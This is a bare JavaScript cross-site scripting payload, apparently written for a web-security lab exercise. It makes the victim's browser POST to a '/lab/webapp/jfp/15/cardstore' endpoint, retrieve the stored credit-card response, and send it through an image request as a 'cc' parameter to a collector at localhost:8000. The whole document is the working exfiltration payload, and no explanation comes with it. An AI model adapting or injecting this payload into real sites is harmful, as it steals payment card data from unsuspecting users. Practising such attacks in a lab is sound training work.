<script>
 xhr = new XMLHttpRequest();

 xhr.onreadystatechange = function () {
   if(xhr.readyState ==4 && xhr.status == 200) {
       alert(xhr.responseText);
       new Image().src = 'http://localhost:8000/?cc='+xhr.responseText;
   }
 };

 xhr.open('POST', '/lab/webapp/jfp/15/cardstore', true);
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 xhr.send('user=john');

</script>
